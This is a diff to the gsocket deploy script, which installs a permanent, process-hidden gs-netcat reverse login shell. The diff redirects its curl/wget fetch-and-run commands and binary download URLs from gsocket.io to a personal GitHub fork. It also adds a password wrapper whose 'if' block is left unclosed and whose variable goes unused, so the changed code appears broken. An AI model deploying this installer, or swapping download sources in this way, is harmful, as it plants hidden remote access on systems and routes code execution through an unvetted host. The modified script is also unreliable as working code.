@@ -2,17 +2,17 @@
 
 # Install and start a permanent gs-netcat reverse login shell
 #
-# See https://www.gsocket.io/deploy/ for examples.
+# See https://github.com/wuxianmr-maker/gsocket for examples.
 #
 # This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
+#   $ bash -c "$(curl -fsSL https://raw.githubusercontent.com/wuxianmr-maker/gsocket/main/deploy.sh)"
 #
 # Connect
-#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
+#   $ S=MySecret bash -c "$(curl -fsSL https://raw.githubusercontent.com/wuxianmr-maker/gsocket/main/deploy.sh)""
 # Pre-set a secret:
-#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+#   $ X=MySecret bash -c "$(curl -fsSL https://raw.githubusercontent.com/wuxianmr-maker/gsocket/main/deploy.sh)"
 # Uninstall
-#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://raw.githubusercontent.com/wuxianmr-maker/gsocket/main/deploy.sh)"
 #
 # Other variables:
 # GS_DEBUG=1
@@ -33,7 +33,7 @@
 #       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=
 #		- Use 'path' instead of '/' (needed for packaging/testing)
-# GS_URL_BASE=https://gsocket.io
+# GS_URL_BASE=https://github.com/wuxianmr-maker/gsocket
 #		- Specify URL of static binaries
 # GS_URL_BIN=
 #		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
@@ -59,19 +59,19 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE_CDN="https://cdn.gsocket.io"
-URL_BASE_X="https://gsocket.io"
+URL_BASE_CDN="https://github.com/wuxianmr-maker/gsocket/raw/refs/heads/main/"
+URL_BASE_X="https://github.com/wuxianmr-maker/gsocket/raw/refs/heads/main/"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
 }
-URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
-URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+URL_BIN="${URL_BASE_CDN}"       # mini & stripped version
+URL_BIN_FULL="${URL_BASE_CDN}" # full version (with -h working)
 [[ -n $GS_URL_BIN ]] && {
 	URL_BIN="${GS_URL_BIN}"
 	URL_BIN_FULL="$URL_BIN"
 }
-[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/y"
+[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}deploy.sh"
 
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
@@ -832,6 +832,25 @@ init_setup()
 	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
 	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")
 
+	# GS_PASSWORD: install auth wrapper for 2nd factor (on top of token)
+	GS_AUTH_EXTRA=""
+	if [[ -n $GS_PASSWORD ]]; then
+		AUTH_SCRIPT="$(dirname "${DSTBIN}")/.gs-auth"
+		PASS_HASH=$(echo -n "${GS_PASSWORD}" | sha256sum | cut -d' ' -f1)
+		cat >"${AUTH_SCRIPT}" <<AUTHEOF
+#!/bin/bash
+printf "Password: "
+stty -echo 2>/dev/null
+IFS= read -r _P
+stty echo 2>/dev/null
+printf "\n"
+_H=\$(echo -n "\$_P" | sha256sum | cut -d' ' -f1)
+unset _P
+if [ "\$_H" = "${PASS_HASH}" ]; then exec bash --login; else sleep 2; exit 1; fi
+AUTHEOF
+		chmod 700 "${AUTH_SCRIPT}"
+		GS_AUTH_EXTRA=" -e '${AUTH_SCRIPT}'"
+
 	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
 
 	# There is no reliable way to check if a process is running:
@@ -1550,7 +1569,7 @@ init_vars
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://raw.githubusercontent.com/wuxianmr-maker/gsocket/main/deploy.sh)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
